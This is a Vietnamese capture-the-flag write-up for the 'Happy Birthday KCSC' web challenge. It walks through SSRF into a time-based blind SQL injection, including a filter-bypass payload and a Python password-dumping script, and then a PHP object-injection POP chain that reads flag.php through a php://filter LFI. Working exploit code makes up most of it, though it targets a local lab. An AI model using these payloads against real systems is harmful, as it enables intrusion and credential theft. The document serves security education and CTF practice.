#  Happy Birthday KCSC
## Description
Whitebox
## Solution
Trước tiên ta sẽ review hết qua source code:

![img](./img/Screenshot%20from%202022-03-06%2021-16-31.png)

- ``index.php``: có param ``url`` được pass qua class ``CURL`` nằm trong ``curl.php``.
- ``curl.php``: ``curl_exec`` ở đây sẽ chỉ trả về giá trị bool để check xem CURL đến thành công hay không
- ``login.php``: nó  tạo query bằng ``bound parameters`` nên có vẻ không sqli được ở đây 
- ``/api/checkUser.php``: Đây rồi, nó nối trực tiếp câu truy vấn SQL động với param id, và nếu `` $_SERVER['REMOTE_ADDR']`` của ta là localhost, ta có thể thực hiện sqli. Đây chính là nơi mọi thứ bắt đầu :v.

Exploit: Ta có thể tận dụng trang index để curl đến ``/api/checkUser.php``. Còn để thực hiện được sqli, cụ thể ở đay là dạng **time based**, ta sẽ bypass cái ``preg_match`` kia bằng case insensitive và ``/**/``

payload: ``http://localhost/api/checkUser.php?id=1/**/AnD/**/SLEEP(5)``

success rồi, giờ viết script để dump mật khẩu thằng admin thui

Script:
```
#!python3
import requests
import string
sess=requests.Session()
url="http://localhost:10666/index.php"
i=1
passwd=''
while True:
    for c in string.printable:
        data={
            'url':f"http://localhost/api/checkUser.php?id=1/**/AND/**/IF(SUBSTRING((SELECT/**/passwoRd/**/FROM/**/users/**/WHERE/**/id=1),{i},1)='{c}',SLEEP(3),1)",
            'submit':'Submit'
        }     
        try:
            r=sess.post(url,data=data,timeout=3)
        except:
            i+=1
            passwd+=c
            print(passwd)
            break
```

![img](./img/Screenshot%20from%202022-03-06%2023-05-38.png)

``password``:``admin_password_foR_testing``

Giờ mình có thể lấy credential này để chui vào trang admin 

Review src code :
- ``admin.php``: Nhìn sơ qua thì có thể thấy rằng đây là dạng deserialize, cụ thể ở đây là thông qua ``$_COOKIE[data]``, Ngoài ra nó còn có filter lọc ``\x00``, theo mình đọc ở trang web [này](https://www.netsparker.com/blog/web-security/untrusted-data-unserialize-php/) thì %00 là null-byte và ``%00sometext%00`` chính là cách biểu diễn của 1 private property, tạm thời cứ thế đã. chui tiếp vao ``chain.php`` nào
- ``chain.php``: Có tất cả 5 classes : ``File``, ``Url``, ``Func1``, ``Func2``, ``Source``, mỗi class đều có phương thức magic method, vậy mục đích của ta ở đây là lợi dụng các magic method này để tấn công POP.

Reference:
- https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
- https://www.php.net/manual/en/language.oop5.magic.php

Các magic method được sử dụng trong bài:

- ``__construct()``: gọi khi khởi tạo đối tượng.
- ``__destruct()``: gọi khi hủy đối tượng.
- ``__get()``: khi đọc dữ liệu từ một thuộc tính không được phép truy cập.
- ``__toString()``: phương thức này giúp class chỉ định xem sẽ in ra cái gì khi nó được dùng.
- ``__invoke()``:phương thức này được gọi khi một lệnh cố gắng gọi một đối tượng như một hàm.
- ``__wakeup``: được gọi khi unserialize() đối tượng.

Khi unserialize thì ``__wakeup()`` sẽ được gọi đầu tiên, vậy ta sẽ khởi tạo tại ``Func2`` trước, và Class mình cần trigger cuối cùng là ``File`` bời vì ta có thể lợi dụng ``include`` để thực hiện LFI (mình đã thử RCE thông qua data:// nhưng mà nó đã set ``allow_url_include=0`` :( ). Giờ thì viết script thui, à mà quên như đã nhắc ở trên, ta còn phải chỉnh property từ private thành public để bypass cái preg_match

```
<?php

class File {
	public $file;

	public function __toString() {
		if (!preg_match('/^(http|https|php|data|zip|input|phar|expect):\/\//', $this->file)) {
			include($this->file);
		}
		return "Ahihhii";
	}
}


class Url {
	public $url;

	public function __construct($url) {
		$this->url = $url;
	}

	public function checkUrl() {
		if (preg_match('/[http|https]:\/\//', $this->url))
			return true;
		else
			return false;
	} 
}


class Func1 {
	public $param1;
	public $param2;

	public function __get($key) {
		$key = $this->param2;
		return $this->param1->$key();
	}
}

class Source {
	public $source;

	public function __construct($s) {
		$this->source = $s;
	}
	public function __invoke() {
		return $this->source->method;
	}
}


class Func2 {
	public $param;

	public function __wakeup() {
		$function = $this->param;
		return $function();
	}
}
$f= new File(); //__tostring
$f->file = 'pHp://FilTer/convert.base64-encode/resource=../flag.php'; // include flag.php được convert sang base64


$func1= new Func1(); // goi tu source qua __get
$func1->param1 = $f;
$func1->param2 = '__toString';


$src = new Source($func1); // goi tu func2 qua __invoke

$func2 = new Func2(); //_wakeup
$func2->param = $src;


$payload = serialize($func2); 
//var_dump((serialize($payload)));
echo base64_encode($payload);

?>
```

![img](./img/Screenshot%20from%202022-03-07%2000-14-00.png)

![img](./img/Screenshot%20from%202022-03-07%2000-14-44.png)

flag: KCSC{real_flag}